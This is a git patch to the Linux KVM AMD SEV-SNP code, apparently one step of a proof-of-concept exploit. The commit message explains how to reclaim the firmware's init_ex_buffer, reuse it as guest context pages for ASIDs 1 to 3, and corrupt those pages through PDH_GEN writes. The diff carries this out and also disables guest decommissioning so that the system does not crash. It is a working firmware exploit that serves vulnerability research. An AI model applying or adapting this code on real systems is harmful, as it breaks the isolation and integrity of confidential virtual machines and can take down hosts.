@@ -1,0 +1,80 @@
+From ac6696d36105af165297618169717f9466f49295 Mon Sep 17 00:00:00 2001
+From: Tom Dohrmann <erbse.13@gmx.de>
+Date: Thu, 4 Jan 2024 20:48:22 +0000
+Subject: [PATCH 5/7] overlap guest context pages with init_ex_buffer
+
+The firmware checks that init_ex_buffer is in the FIRMWARE state, but
+allows us to move it back into the HYPERVISOR state with the
+PAGE_RECLAIM command. Once that's happened we can transition
+init_ex_buffer into the CONTEXT state and use it as several guest
+context pages. We can then corrupt these guest context pages by
+triggering writes to init_ex_buffer e.g. using PDH_GEN. PDH_GEN
+overwrites 3 guest context pages worth of memory.
+---
+ arch/x86/kvm/svm/sev.c | 30 ++++++++++++++++++++++++++++--
+ 1 file changed, 28 insertions(+), 2 deletions(-)
+
+diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
+index d71ec257debb..7e2c65df9241 100644
+--- a/arch/x86/kvm/svm/sev.c
++++ b/arch/x86/kvm/svm/sev.c
+@@ -1965,6 +1965,9 @@ int sev_vm_move_enc_context_from(struct kvm *kvm, unsigned int source_fd)
+ 	return ret;
+ }
+ 
++void* get_sev_init_ex_buffer(void);
++int snp_reclaim_pages(unsigned long paddr, unsigned int npages, bool locked);
++
+ /*
+  * The guest context contains all the information, keys and metadata
+  * associated with the guest that the firmware tracks to implement SEV
+@@ -1978,14 +1981,32 @@ static void *snp_context_create(struct kvm *kvm, struct kvm_sev_cmd *argp)
+ 	int rc;
+ 
+ 	/* Allocate memory for context page */
+-	context = snp_alloc_firmware_page(GFP_KERNEL_ACCOUNT);
++	if (sev_get_asid(kvm) < 4) {
++		// If the asid is in range 1..=3, use the first three pages of the sev_init_ex
++		// buffer.
++		int idx = sev_get_asid(kvm) - 1;
++		phys_addr_t pfn = __psp_pa(get_sev_init_ex_buffer());
++		context = phys_to_virt(pfn + (idx << PAGE_SHIFT));
++		
++		// Transition the page in `sev_init_ex` from HYPERVISOR into CONTEXT. 
++		rmp_make_private((pfn >> PAGE_SHIFT) + idx, 0, PG_LEVEL_4K, 0, true);
++	}
++	else {
++		// Allocate guest context pages normally for other ASIDs.
++		context = snp_alloc_firmware_page(GFP_KERNEL_ACCOUNT);
++	}
+ 	if (!context)
+ 		return NULL;
+ 
+ 	data.gctx_paddr = __psp_pa(context);
+ 	rc = __sev_issue_cmd(argp->sev_fd, SEV_CMD_SNP_GCTX_CREATE, &data, &argp->error);
+ 	if (rc) {
+-		snp_free_firmware_page(context);
++		if (sev_get_asid(kvm) < 4) {
++			int idx = sev_get_asid(kvm) - 1;
++			snp_reclaim_pages(__psp_pa(context) + (idx << PAGE_SHIFT), 1, true);
++		}
++		else
++			snp_free_firmware_page(context);
+ 		return NULL;
+ 	}
+ 
+@@ -2716,6 +2737,11 @@ static int snp_decommission_context(struct kvm *kvm)
+ 	struct sev_data_snp_addr data = {};
+ 	int ret;
+ 
++	// Don't actually decomission the guest. If the guest context page is
++	// corrupted, decommissioning it tends to crash the SEV-firmware which
++	// leads to a reset of the whole system.
++	sev->snp_context = NULL;
++
+ 	/* If context is not created then do nothing */
+ 	if (!sev->snp_context)
+ 		return 0;
+-- 
+2.34.1
+
